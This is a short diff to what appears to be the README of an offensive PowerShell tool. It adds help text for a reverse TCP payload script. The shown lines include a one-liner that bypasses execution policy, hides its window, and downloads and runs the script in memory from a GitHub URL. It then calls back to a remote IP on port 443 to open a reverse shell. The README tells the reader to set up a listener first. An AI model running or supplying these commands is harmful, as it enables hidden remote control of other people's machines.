@@ -8,6 +8,8 @@ powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuser
 
 
 # Help for rev.ps1:
+It's a reverse_tcp payload, please set a listener, then do as below:
+
 winx86:
 
 powrshell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aspiggy/Cloudpower/master/rev.ps1'); rev -ip 4.4.4.4 -port 443"
